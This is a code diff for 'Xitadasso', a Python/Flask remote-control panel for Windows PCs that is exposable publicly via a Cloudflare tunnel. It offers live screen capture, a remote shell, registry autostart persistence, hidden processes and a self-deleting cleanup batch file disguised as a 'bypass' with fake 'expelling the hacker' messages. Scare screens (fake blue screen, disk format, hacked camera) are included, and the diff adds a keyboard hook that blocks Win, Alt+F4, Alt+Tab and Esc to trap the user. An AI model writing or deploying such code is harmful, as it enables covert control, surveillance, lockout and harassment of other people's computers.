@@ -1,6 +1,6 @@
 """
-Xitadasso - painel de testes com site local (LAN) ou publico (fora de casa via Cloudflare).
-Requisitos: pip install flask pillow mss  (e pyinstaller pra gerar exe)
+Xitadasso - painel de testes (LAN / Cloudflare Tunnel).
+pip install flask pillow mss
 """
 import io
 import os
@@ -76,6 +76,14 @@ class PONTO(ctypes.Structure):
     _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
 
 
+class KBDLLHOOKSTRUCT(ctypes.Structure):
+    _fields_ = [("vkCode", ctypes.c_ulong),
+                ("scanCode", ctypes.c_ulong),
+                ("flags", ctypes.c_ulong),
+                ("time", ctypes.c_ulong),
+                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]
+
+
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(16)
 
@@ -113,25 +121,13 @@ def salvar_config():
 
 ESTADO = carregar_config()
 
-# ---------- efeitos persistentes (com stop) ----------
-EFEITOS_ATIVOS = {
-    "mouse_center": False,
-    "mouse_invert": False,
-    "wallpaper": False,
-    "invert_colors": False,
-    "rotate": None,   # "down","up","left","right" ou None
-}
+EFEITOS_ATIVOS = {"mouse_center": False, "mouse_invert": False,
+                  "wallpaper": False, "invert_colors": False, "rotate": None}
 
 # ---------- captura de tela ----------
-TELA = {
-    "thread": None,
-    "ativo": False,
-    "ultimo_jpeg": None,
-    "ultimo_pedido": 0.0,
-    "config": (40, 1280, "all"),
-    "lock": threading.Lock(),
-    "erro": None,
-}
+TELA = {"thread": None, "ativo": False, "ultimo_jpeg": None,
+        "ultimo_pedido": 0.0, "config": (40, 1280, "all"),
+        "lock": threading.Lock(), "erro": None}
 
 
 def _loop_captura():
@@ -145,20 +141,15 @@ def _loop_captura():
                     q, w, mon = TELA["config"]
                     if mon == "all":
                         idx = 0
-                    elif mon == "primary":
-                        idx = 1
                     else:
-                        try:
-                            idx = int(mon)
-                        except Exception:
-                            idx = 1
+                        try: idx = int(mon)
+                        except Exception: idx = 1
                         if idx < 1 or idx >= len(sct.monitors):
                             idx = 1
                     shot = sct.grab(sct.monitors[idx])
                     pil = _PILImage.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                     if pil.width > w:
-                        nova_altura = round(pil.height * w / pil.width)
-                        pil = pil.resize((w, nova_altura))
+                        pil = pil.resize((w, round(pil.height * w / pil.width)))
                     buf = io.BytesIO()
                     pil.save(buf, "JPEG", quality=q)
                     with TELA["lock"]:
@@ -208,10 +199,8 @@ def ip_local():
 
 
 def log_seguro(*args):
-    try:
-        print(*args)
-    except Exception:
-        pass
+    try: print(*args)
+    except Exception: pass
 
 
 # ---------- autostart ----------
@@ -220,21 +209,16 @@ REG_NOME = "Xitadasso"
 
 
 def autostart_ativo():
-    if winreg is None:
-        return False
+    if winreg is None: return False
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ) as k:
-            winreg.QueryValueEx(k, REG_NOME)
-            return True
-    except FileNotFoundError:
-        return False
+            winreg.QueryValueEx(k, REG_NOME); return True
     except Exception:
         return False
 
 
 def set_autostart(ativo):
-    if winreg is None:
-        return False
+    if winreg is None: return False
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE) as k:
             if ativo:
@@ -242,23 +226,18 @@ def set_autostart(ativo):
                     cmd = f'"{sys.executable}"'
                 else:
                     pyw = sys.executable.replace("python.exe", "pythonw.exe")
-                    if os.path.exists(pyw):
-                        cmd = f'"{pyw}" "{os.path.abspath(__file__)}"'
-                    else:
-                        cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+                    cmd = (f'"{pyw}" "{os.path.abspath(__file__)}"' if os.path.exists(pyw)
+                           else f'"{sys.executable}" "{os.path.abspath(__file__)}"')
                 winreg.SetValueEx(k, REG_NOME, 0, winreg.REG_SZ, cmd)
             else:
-                try:
-                    winreg.DeleteValue(k, REG_NOME)
-                except FileNotFoundError:
-                    pass
+                try: winreg.DeleteValue(k, REG_NOME)
+                except FileNotFoundError: pass
         return True
     except Exception as e:
-        log_seguro("erro autostart:", e)
-        return False
+        log_seguro("erro autostart:", e); return False
 
 
-# ---------- tunel Cloudflare ----------
+# ---------- tunel ----------
 TUNEL = {"proc": None, "url": None, "thread": None, "ativo": False}
 CF_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
 
@@ -268,15 +247,12 @@ def caminho_cloudflared():
 
 
 def baixar_cloudflared():
-    destino = caminho_cloudflared()
-    if os.path.exists(destino):
-        return destino
+    d = caminho_cloudflared()
+    if os.path.exists(d): return d
     try:
-        urllib.request.urlretrieve(CF_URL, destino)
-        return destino
+        urllib.request.urlretrieve(CF_URL, d); return d
     except Exception as e:
-        log_seguro("erro baixando cloudflared:", e)
-        return None
+        log_seguro("erro cloudflared:", e); return None
 
 
 def _loop_tunel():
@@ -284,91 +260,133 @@ def _loop_tunel():
     TUNEL["ativo"] = True
     cf = baixar_cloudflared()
     if not cf:
-        TUNEL["url"] = "ERRO: nao consegui baixar o cloudflared"
-        TUNEL["ativo"] = False
-        return
+        TUNEL["url"] = "ERRO: nao consegui baixar"; TUNEL["ativo"] = False; return
     TUNEL["url"] = "iniciando tunel..."
     try:
-        proc = subprocess.Popen(
-            [cf, "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            stdin=subprocess.DEVNULL, text=True, bufsize=1,
-            creationflags=CREATE_NO_WINDOW,
-        )
+        proc = subprocess.Popen([cf, "tunnel", "--url", "http://localhost:5000", "--no-autoupdate"],
+                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                stdin=subprocess.DEVNULL, text=True, bufsize=1,
+                                creationflags=CREATE_NO_WINDOW)
         TUNEL["proc"] = proc
-        url_re = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
-        for linha in proc.stdout:
-            m = url_re.search(linha)
+        ur = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
+        for l in proc.stdout:
+            m = ur.search(l)
             if m:
-                TUNEL["url"] = m.group(0)
-                TUNEL["ativo"] = True
-                log_seguro("Tunel ativo:", TUNEL["url"])
-                break
-        for _ in proc.stdout:
-            pass
+                TUNEL["url"] = m.group(0); TUNEL["ativo"] = True
+                log_seguro("Tunel:", TUNEL["url"]); break
+        for _ in proc.stdout: pass
     except Exception as e:
-        log_seguro("erro tunel:", e)
-        TUNEL["url"] = "ERRO: " + str(e)
-        TUNEL["ativo"] = False
+        log_seguro("erro tunel:", e); TUNEL["url"] = "ERRO: "+str(e); TUNEL["ativo"] = False
 
 
 def parar_tunel():
-    proc = TUNEL.get("proc")
-    TUNEL["proc"] = None
-    TUNEL["ativo"] = False
-    TUNEL["url"] = None
-    if proc is not None:
-        try:
-            executar(["taskkill", "/PID", str(proc.pid), "/T", "/F"], capture_output=True)
+    p = TUNEL.get("proc"); TUNEL["proc"] = None
+    TUNEL["ativo"] = False; TUNEL["url"] = None
+    if p is not None:
+        try: executar(["taskkill","/PID",str(p.pid),"/T","/F"], capture_output=True)
         except Exception:
-            try:
-                proc.kill()
-            except Exception:
-                pass
+            try: p.kill()
+            except Exception: pass
 
 
 def iniciar_tunel_async():
-    if TUNEL["ativo"] or (TUNEL["thread"] and TUNEL["thread"].is_alive()):
-        return
-    TUNEL["ativo"] = True
-    TUNEL["url"] = "iniciando..."
-    TUNEL["thread"] = threading.Thread(target=_loop_tunel, daemon=True)
-    TUNEL["thread"].start()
+    if TUNEL["ativo"] or (TUNEL["thread"] and TUNEL["thread"].is_alive()): return
+    TUNEL["ativo"] = True; TUNEL["url"] = "iniciando..."
+    TUNEL["thread"] = threading.Thread(target=_loop_tunel, daemon=True); TUNEL["thread"].start()
 
 
-# ---------- autodelete (BYPASS) ----------
+# ---------- autodelete ----------
 def agendar_autodelete():
-    if not getattr(sys, "frozen", False):
-        return False
-    exe = sys.executable
-    cf = caminho_cloudflared()
+    if not getattr(sys, "frozen", False): return False
+    exe = sys.executable; cf = caminho_cloudflared()
     bat = os.path.join(tempfile.gettempdir(), "xitadasso_cleanup.bat")
-    linhas = [
-        "@echo off", ":waitloop", "timeout /t 1 /nobreak >nul 2>&1",
-        f'del /f /q "{exe}" >nul 2>&1', f'if exist "{exe}" goto waitloop',
-        f'del /f /q "{cf}" >nul 2>&1', 'del /f /q "%~f0" >nul 2>&1',
-    ]
+    linhas = ["@echo off", ":waitloop", "timeout /t 1 /nobreak >nul 2>&1",
+              f'del /f /q "{exe}" >nul 2>&1', f'if exist "{exe}" goto waitloop',
+              f'del /f /q "{cf}" >nul 2>&1', 'del /f /q "%~f0" >nul 2>&1']
     try:
-        with open(bat, "w", encoding="utf-8") as f:
-            f.write("\r\n".join(linhas))
-    except Exception:
-        return False
-    DETACHED_PROCESS = 0x00000008
+        with open(bat, "w", encoding="utf-8") as f: f.write("\r\n".join(linhas))
+    except Exception: return False
     try:
-        subprocess.Popen(["cmd", "/c", bat],
-                         creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
-                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                         close_fds=True)
+        subprocess.Popen(["cmd","/c",bat],
+                         creationflags=CREATE_NO_WINDOW | 0x00000008,
+                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL, close_fds=True)
         return True
-    except Exception:
-        return False
+    except Exception: return False
 
 
-# ============================================================================
-# PAGINAS (HTML)
-# ============================================================================
+# ============================================================
+# HOOK DE TECLADO DO KIOSK (bloqueia Win, Alt+F4, Alt+Tab, Ctrl+W/T/N, F11, Esc)
+# ============================================================
+BLOQUEIO_KIOSK = {"ativo": False}
+_HOOK_KIOSK_THREAD = {"t": None}
+_HOOKPROC_KB = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, ctypes.c_size_t, ctypes.c_ssize_t) if os.name == "nt" else None
 
-PAGINA = """
+
+def _loop_hook_kiosk():
+    u = ctypes.windll.user32
+    k = ctypes.windll.kernel32
+    u.SetWindowsHookExW.argtypes = [ctypes.c_int, _HOOKPROC_KB, ctypes.c_void_p, ctypes.c_uint]
+    u.SetWindowsHookExW.restype = ctypes.c_void_p
+    u.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
+    u.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_size_t, ctypes.c_ssize_t]
+    u.CallNextHookEx.restype = ctypes.c_ssize_t
+
+    def blk(codigo, wparam, lparam):
+        if codigo < 0 or not BLOQUEIO_KIOSK["ativo"]:
+            return u.CallNextHookEx(None, codigo, wparam, lparam)
+        try:
+            kb = ctypes.cast(lparam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+            vk = kb.vkCode
+        except Exception:
+            return u.CallNextHookEx(None, codigo, wparam, lparam)
+        alt = bool(u.GetAsyncKeyState(0x12) & 0x8000)
+        ctrl = bool(u.GetAsyncKeyState(0x11) & 0x8000)
+        # Bloqueios:
+        if vk in (0x5B, 0x5C): return 1               # Win
+        if vk == 0x73 and alt: return 1               # Alt+F4
+        if vk == 0x09 and alt: return 1               # Alt+Tab
+        if vk == 0x1B and alt: return 1               # Alt+Esc
+        if vk == 0x7A: return 1                       # F11
+        if vk == 0x1B: return 1                       # Esc
+        if ctrl and vk in (0x57, 0x54, 0x4E, 0x52, 0x50): return 1  # Ctrl+W/T/N/R/P
+        return u.CallNextHookEx(None, codigo, wparam, lparam)
+
+    proc = _HOOKPROC_KB(blk)
+    hk = None
+    try:
+        mod = k.GetModuleHandleW(None)
+        hk = u.SetWindowsHookExW(13, proc, mod, 0)
+        while BLOQUEIO_KIOSK["ativo"]:
+            msg = ctypes.create_string_buffer(64)
+            while u.PeekMessageW(msg, None, 0, 0, 1):
+                u.TranslateMessage(msg); u.DispatchMessageW(msg)
+            time.sleep(0.005)
+    except Exception as e:
+        log_seguro("hook kiosk:", e)
+    finally:
+        if hk:
+            try: u.UnhookWindowsHookEx(hk)
+            except Exception: pass
+        BLOQUEIO_KIOSK["ativo"] = False
+
+
+def ligar_bloqueio_kiosk():
+    BLOQUEIO_KIOSK["ativo"] = True
+    if not (_HOOK_KIOSK_THREAD["t"] and _HOOK_KIOSK_THREAD["t"].is_alive()):
+        _HOOK_KIOSK_THREAD["t"] = threading.Thread(target=_loop_hook_kiosk, daemon=True)
+        _HOOK_KIOSK_THREAD["t"].start()
+
+
+def desligar_bloqueio_kiosk():
+    BLOQUEIO_KIOSK["ativo"] = False
+
+
+# ============================================================
+# PAGINAS
+# ============================================================
+
+PAGINA = r"""
 <!doctype html>
 <html lang="pt-br">
 <head>
@@ -442,7 +460,7 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
 
     <div class="cards" id="pa">
       <div class="card">
-        <h3>Acoes rapidas</h3>
+        <h3>Ações rápidas</h3>
         <div class="grid-btns">
           <button class="btn" onclick="rodar('terminal_hacker')">Terminal hacker</button>
           <button class="btn" onclick="abrirAbas()">Abrir abas</button>
@@ -451,15 +469,15 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
       </div>
       <div class="card">
         <h3>Telas cheias no PC</h3>
-        <span class="hint">Escolha o efeito, abre em tela cheia. Feche com "Fechar efeito".</span>
+        <span class="hint">Abre em tela cheia bloqueando Win / Alt+F4 / Alt+Tab. Feche pelo botão "Fechar efeito".</span>
         <div class="grid-btns">
           <button class="btn" onclick="rodar('efeito_pc',{nome:'hacker'})">Hacker</button>
           <button class="btn" onclick="rodar('efeito_pc',{nome:'matrix'})">Matrix</button>
           <button class="btn" onclick="rodar('efeito_pc',{nome:'bsod'})">Tela azul</button>
           <button class="btn" onclick="rodar('efeito_pc',{nome:'update'})">Windows Update</button>
           <button class="btn" onclick="rodar('efeito_pc',{nome:'format'})">Formatando disco</button>
-          <button class="btn" onclick="rodar('efeito_pc',{nome:'scanner'})">Scanner de virus</button>
-          <button class="btn" onclick="rodar('efeito_pc',{nome:'camera'})">Camera invadida</button>
+          <button class="btn" onclick="rodar('efeito_pc',{nome:'scanner'})">Scanner de vírus</button>
+          <button class="btn" onclick="rodar('efeito_pc',{nome:'camera'})">Câmera invadida</button>
           <button class="btn outline" onclick="rodar('fechar_efeito')">Fechar efeito</button>
         </div>
       </div>
@@ -474,8 +492,7 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
             <span class="hint">Monitor</span>
             <select id="telaMon" onchange="telaMonitor=this.value">
               <option value="all" selected>Todos juntos</option>
-              <option value="primary">So o principal</option>
-              <option value="1">Monitor 1</option>
+              <option value="1">Monitor 1 (principal)</option>
               <option value="2">Monitor 2</option>
               <option value="3">Monitor 3</option>
             </select>
@@ -484,13 +501,13 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
             <span class="hint">Qualidade</span>
             <select id="telaQ" onchange="telaQualidade=+this.value">
               <option value="25">Baixa</option>
-              <option value="40" selected>Media</option>
+              <option value="40" selected>Média</option>
               <option value="60">Alta</option>
-              <option value="80">Maxima</option>
+              <option value="80">Máxima</option>
             </select>
           </div>
           <div class="row">
-            <span class="hint">Resolucao</span>
+            <span class="hint">Resolução</span>
             <select id="telaW" onchange="telaLargura=+this.value">
               <option value="960">960</option>
               <option value="1280" selected>1280</option>
@@ -508,14 +525,14 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
       <div class="card">
         <h3>Trollagens do PC</h3>
         <div class="row">
-          <span class="hint">Duracao (segundos)</span>
+          <span class="hint">Duração (segundos)</span>
           <input id="trollSeg" type="number" value="10" min="3" max="600" style="width:90px">
         </div>
         <div class="grid-btns">
           <button class="btn" onclick="rodar('mouse_center',{segundos:$('#trollSeg').value})">Travar cursor no centro</button>
           <button class="btn" onclick="rodar('mouse_invert',{segundos:$('#trollSeg').value})">Inverter mouse</button>
           <button class="btn" onclick="rodar('wallpaper_troll',{segundos:$('#trollSeg').value})">Wallpaper troll</button>
-          <button class="btn" onclick="rodar('popup_antivirus')">Popup antivirus</button>
+          <button class="btn" onclick="rodar('popup_antivirus')">Popup antivírus</button>
         </div>
         <div class="row">
           <span class="hint">Notepads</span>
@@ -525,7 +542,7 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
           <button class="btn" onclick="rodar('notepad_bomb',{quantidade:$('#trollN').value})">Bomba de notepads</button>
           <button class="btn outline" id="btnInvert" onclick="toggleInvert()">Inverter cores: OFF</button>
         </div>
-        <span class="hint">Girar tela (funciona em Intel e alguns drivers):</span>
+        <span class="hint">Girar tela (só funciona em alguns drivers Intel):</span>
         <div class="grid-3">
           <button class="btn" onclick="rodar('rotate_screen',{direcao:'up'})">↑ Normal</button>
           <button class="btn" onclick="rodar('rotate_screen',{direcao:'left'})">← 90</button>
@@ -599,20 +616,20 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
         <h3>Modo de acesso</h3>
         <div class="grid-btns">
           <button class="btn outline" id="btnModoLan" onclick="setModo('lan')">
-            <b>Wi-Fi local (LAN)</b><small>So na mesma rede Wi-Fi</small>
+            <b>Wi-Fi local (LAN)</b><small>Só na mesma rede Wi-Fi</small>
           </button>
           <button class="btn outline" id="btnModoWan" onclick="setModo('wan')">
-            <b>Fora de casa (publico)</b><small>Link Cloudflare, qualquer rede</small>
+            <b>Fora de casa (público)</b><small>Link Cloudflare, qualquer rede</small>
           </button>
         </div>
         <div class="warn hid" id="wanAviso">
-          <b>Atencao:</b> acesso publico ativo. <b>Defina um PIN</b> abaixo!
+          <b>Atenção:</b> acesso público ativo. <b>Defina um PIN</b> abaixo!
         </div>
         <div class="ipbox hid" id="tunelBox"></div>
         <span class="hint" id="tunelStatus"></span>
       </div>
       <div class="card">
-        <h3>Inicializacao</h3>
+        <h3>Inicialização</h3>
         <button class="btn block outline" id="btnAuto" onclick="toggleAuto()">Iniciar com Windows: DESATIVADO</button>
       </div>
       <div class="card">
@@ -620,7 +637,7 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
         <div class="ipbox" id="ipShow">carregando...</div>
       </div>
       <div class="card">
-        <h3>PIN de seguranca</h3>
+        <h3>PIN de segurança</h3>
         <div class="warn hid" id="pinWarn">Sem PIN: qualquer aparelho na rede pode controlar este PC.</div>
         <input id="pinIn" type="password" placeholder="Definir um PIN (4 a 32 caracteres)">
         <div class="grid-btns">
@@ -638,7 +655,7 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
 
 <div class="modal-bg" id="modalBg">
   <div class="modal">
-    <div id="modalTitulo">Confirmar acao</div>
+    <div id="modalTitulo">Confirmar ação</div>
     <input type="number" id="segundos" value="30" min="5">
     <div class="hint">segundos</div>
     <button class="btn" onclick="confirmarAcao()">Confirmar</button>
@@ -649,7 +666,7 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
 <div class="lock hid" id="lockScreen">
   <div class="lockbox">
     <div class="logo" style="justify-content:center"><img class="logoimg" src="/logo.png" alt="XITADASSO"></div>
-    <p class="hint">Este painel esta protegido por PIN.</p>
+    <p class="hint">Este painel está protegido por PIN.</p>
     <input type="password" id="lockPin" placeholder="PIN">
     <button class="btn block" onclick="entrarPin()">Entrar</button>
   </div>
@@ -659,104 +676,82 @@ select{background:#1a1a20;color:var(--fg);border:1px solid var(--line);border-ra
 const $=s=>document.querySelector(s),$$=s=>[...document.querySelectorAll(s)];
 function show(p){["a","b","c"].forEach(x=>$("#p"+x).classList.toggle("hid",x!==p));$$(".tab,.nav").forEach(b=>b.classList.toggle("on",b.dataset.p===p))}
 $$(".tab,.nav").forEach(b=>b.onclick=()=>show(b.dataset.p));
-
 const consoleDiv=$("#term");
 function log(txt){consoleDiv.textContent+=txt+"\\n";consoleDiv.scrollTop=consoleDiv.scrollHeight}
-
 async function rodar(acao,dados){
-  show('b');
-  log("> executando: "+acao);
+  show('b'); log("> executando: "+acao);
   const r=await fetch('/api/'+acao,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(dados||{})});
   if(r.status===401){mostrarLock();return}
   const j=await r.json();
   log(j.saida||j.erro||"ok");
 }
-
 function abrirAbas(){
-  const links=prompt("Cole os links separados por espaco:","https://www.google.com https://www.wikipedia.org");
-  if(links===null)return;
-  rodar('abrir_abas',{links:links});
+  const links=prompt("Cole os links separados por espaço:","https://www.google.com https://www.wikipedia.org");
+  if(links===null)return; rodar('abrir_abas',{links:links});
 }
-
 const pausa=ms=>new Promise(r=>setTimeout(r,ms));
 async function encerrarPrograma(passos, deletar){
-  show('b');
-  for(const p of passos){log(p);await pausa(700)}
+  show('b'); for(const p of passos){log(p);await pausa(700)}
   const endpoint = deletar ? '/api/bypass' : '/api/fechar_menu';
   const r=await fetch(endpoint,{method:'POST'}).catch(()=>null);
-  if(r&&r.status===401){log("[ERRO] sessao expirada.");mostrarLock();return}
-  if(!r){log("[ERRO] nao consegui falar com o programa.");return}
+  if(r&&r.status===401){log("[ERRO] sessão expirada.");mostrarLock();return}
+  if(!r){log("[ERRO] não consegui falar com o programa.");return}
   log(deletar ? "[OK] Encerrando e apagando..." : "[OK] Encerrando...");
   for(let i=0;i<20;i++){
     await pausa(400);
     try{await fetch('/api/state',{cache:'no-store'})}
     catch(e){
       const extra = deletar ? '<br><small style="margin-top:8px;display:block">O .exe foi removido automaticamente.</small>' : '';
-      document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;text-align:center;color:#8b8b99;font:16px system-ui">Conexao encerrada.<br>Xitadasso desligado.'+extra+'</div>';
+      document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;text-align:center;color:#8b8b99;font:16px system-ui">Conexão encerrada.<br>Xitadasso desligado.'+extra+'</div>';
       return;
     }
   }
 }
-
 async function pararTudo(){
   log("> PARAR TUDO");
   await fetch('/api/parar_tudo',{method:'POST'});
   log("[+] Todos os efeitos parados.");
-  autoInvert = false;
-  atualizarBotaoInvert();
+  autoInvert=false; atualizarBotaoInvert();
 }
 
-// ----- Minha Tela -----
 let telaAtiva=false, telaTimer=null, telaEmVoo=false;
 let telaQualidade=40, telaLargura=1280, telaMonitor="all";
 const TELA_CICLO=80;
-
 function alternarTela(){
-  telaAtiva = !telaAtiva;
-  $('#btnTela').textContent = telaAtiva ? 'Parar' : 'Ver minha tela';
-  $('#telaWrap').style.display = telaAtiva ? 'block' : 'none';
-  $('#telaOpts').style.display = telaAtiva ? 'flex' : 'none';
-  if(telaAtiva){ atualizarTela(); }
-  else { clearTimeout(telaTimer); telaEmVoo=false; $('#telaStatus').textContent=''; }
+  telaAtiva=!telaAtiva;
+  $('#btnTela').textContent=telaAtiva?'Parar':'Ver minha tela';
+  $('#telaWrap').style.display=telaAtiva?'block':'none';
+  $('#telaOpts').style.display=telaAtiva?'flex':'none';
+  if(telaAtiva){atualizarTela()}else{clearTimeout(telaTimer);telaEmVoo=false;$('#telaStatus').textContent=''}
 }
-
 async function atualizarTela(){
-  if(!telaAtiva) return;
-  if(telaEmVoo){ telaTimer=setTimeout(atualizarTela,40); return; }
-  if(document.hidden){ telaTimer=setTimeout(atualizarTela,800); return; }
-  telaEmVoo=true;
-  const t0=performance.now();
+  if(!telaAtiva)return;
+  if(telaEmVoo){telaTimer=setTimeout(atualizarTela,40);return}
+  if(document.hidden){telaTimer=setTimeout(atualizarTela,800);return}
+  telaEmVoo=true; const t0=performance.now();
   try{
     const r=await fetch(`/api/tela.jpg?q=${telaQualidade}&w=${telaLargura}&mon=${telaMonitor}&t=${Date.now()}`,{cache:'no-store'});
     if(r.status===401){mostrarLock();telaAtiva=false;telaEmVoo=false;return}
-    if(!r.ok){ $('#telaStatus').textContent = r.status===503?'iniciando...':'sem sinal...'; throw 0; }
+    if(!r.ok){$('#telaStatus').textContent=r.status===503?'iniciando...':'sem sinal...';throw 0}
     const blob=await r.blob();
     const bmp=await createImageBitmap(blob);
     const cv=$('#telaCanvas');
     if(cv.width!==bmp.width||cv.height!==bmp.height){cv.width=bmp.width;cv.height=bmp.height}
-    cv.getContext('2d').drawImage(bmp,0,0);
-    bmp.close();
+    cv.getContext('2d').drawImage(bmp,0,0); bmp.close();
     $('#telaStatus').textContent='';
-  }catch(e){ if(!$('#telaStatus').textContent) $('#telaStatus').textContent='sem sinal...'; }
-  const dt=performance.now()-t0;
-  telaEmVoo=false;
+  }catch(e){if(!$('#telaStatus').textContent)$('#telaStatus').textContent='sem sinal...'}
+  const dt=performance.now()-t0; telaEmVoo=false;
   telaTimer=setTimeout(atualizarTela, Math.max(20, TELA_CICLO-dt));
 }
 document.addEventListener('visibilitychange',()=>{
-  if(!document.hidden && telaAtiva && !telaEmVoo){ clearTimeout(telaTimer); atualizarTela(); }
+  if(!document.hidden && telaAtiva && !telaEmVoo){clearTimeout(telaTimer);atualizarTela()}
 });
 
-function fecharMenu(){ encerrarPrograma(["[*] Encerrando o Xitadasso..."], false); }
+function fecharMenu(){encerrarPrograma(["[*] Encerrando o Xitadasso..."],false)}
 function bypass(){
-  encerrarPrograma([
-    "[*] BYPASS iniciado...",
-    "[+] Rastreando invasor... 192.168.0.666",
-    "[+] Revertendo payload...",
-    "[+] Expulsando o hacker...",
-    "[+] Removendo arquivos deixados pelo invasor..."
-  ], true);
+  encerrarPrograma(["[*] BYPASS iniciado...","[+] Rastreando invasor... 192.168.0.666",
+    "[+] Revertendo payload...","[+] Expulsando o hacker...","[+] Removendo arquivos..."],true);
 }
-
 let acaoModal=null;
 function abrirModal(acao){
   acaoModal=acao;
@@ -765,21 +760,18 @@ function abrirModal(acao){
 }
 function fecharModal(){$("#modalBg").style.display='none'}
 function confirmarAcao(){const seg=$("#segundos").value||30;fecharModal();rodar(acaoModal,{segundos:seg})}
-
 let comandoAtivo=null;
 async function rodarComando(){
   const input=$("#cmdInput"),cmd=input.value.trim();
   if(!cmd||comandoAtivo)return;
   input.value=''; show('b'); log("> executando: "+cmd);
   comandoAtivo=crypto.randomUUID?crypto.randomUUID():String(Date.now());
-  $("#btnCancelar").disabled=false;
-  const id=comandoAtivo;
+  $("#btnCancelar").disabled=false; const id=comandoAtivo;
   const r=await fetch('/api/shell',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({comando:cmd,id:id})});
   if(comandoAtivo!==id)return;
   comandoAtivo=null; $("#btnCancelar").disabled=true;
   if(r.status===401){mostrarLock();return}
-  const j=await r.json();
-  log(j.saida||j.erro||"ok");
+  const j=await r.json(); log(j.saida||j.erro||"ok");
 }
 async function cancelarComando(){
   if(!comandoAtivo)return;
@@ -788,12 +780,11 @@ async function cancelarComando(){
   await fetch('/api/shell_cancelar',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id})});
   log("comando cancelado.");
 }
-
 async function definirPin(){
   const pin=$("#pinIn").value.trim();
-  if(pin.length<4){alert("PIN precisa ter 4+ caracteres.");return}
+  if(pin.length<4){alert("O PIN precisa ter 4+ caracteres.");return}
   const r=await fetch('/api/pin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pin})});
-  if(r.ok){$("#pinIn").value='';carregarEstado()} else alert((await r.json()).erro||"erro")
+  if(r.ok){$("#pinIn").value='';carregarEstado()}else alert((await r.json()).erro||"erro")
 }
 async function removerPin(){
   if(!confirm("Remover o PIN?"))return;
@@ -807,14 +798,10 @@ async function entrarPin(){
   if(r.ok){$("#lockScreen").classList.add("hid");$("#lockPin").value='';carregarEstado()}
   else alert("PIN incorreto.");
 }
-
-// mensagem padrao
 let msgPadraoSalva="Voce foi hackeado!";
 async function carregarMsg(){
-  try{
-    const r=await fetch('/api/config'); const j=await r.json();
-    msgPadraoSalva = j.msg_padrao || "Voce foi hackeado!";
-    $('#msgTexto').value = msgPadraoSalva;
+  try{const r=await fetch('/api/config');const j=await r.json();
+    msgPadraoSalva=j.msg_padrao||"Voce foi hackeado!";$('#msgTexto').value=msgPadraoSalva;
   }catch(e){}
 }
 async function salvarMsg(){
@@ -822,118 +809,102 @@ async function salvarMsg(){
   await fetch('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msg_padrao:t})});
   msgPadraoSalva=t; log("[+] Texto salvo.");
 }
-function restaurarMsg(){ $('#msgTexto').value = msgPadraoSalva; }
-
-// autostart
+function restaurarMsg(){$('#msgTexto').value=msgPadraoSalva}
 let autoAtivo=false;
 async function carregarAuto(){
-  try{ const r=await fetch('/api/autostart'); const j=await r.json(); autoAtivo=!!j.ativo; atualizarBotaoAuto(); }catch(e){}
+  try{const r=await fetch('/api/autostart');const j=await r.json();autoAtivo=!!j.ativo;atualizarBotaoAuto()}catch(e){}
 }
 function atualizarBotaoAuto(){
   const b=$('#btnAuto');
-  if(autoAtivo){ b.innerHTML='✓ Iniciar com Windows: <b>ATIVADO</b>'; b.classList.remove('outline'); b.classList.add('on'); }
-  else{ b.innerHTML='Iniciar com Windows: DESATIVADO'; b.classList.add('outline'); b.classList.remove('on'); }
+  if(autoAtivo){b.innerHTML='✓ Iniciar com Windows: <b>ATIVADO</b>';b.classList.remove('outline');b.classList.add('on')}
+  else{b.innerHTML='Iniciar com Windows: DESATIVADO';b.classList.add('outline');b.classList.remove('on')}
 }
 async function toggleAuto(){
   const novo=!autoAtivo;
   const r=await fetch('/api/autostart',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:novo})});
-  if(r.ok){ autoAtivo=novo; atualizarBotaoAuto(); log(novo?"[+] Autostart ON":"[+] Autostart OFF"); }
+  if(r.ok){autoAtivo=novo;atualizarBotaoAuto();log(novo?"[+] Autostart ON":"[+] Autostart OFF")}
 }
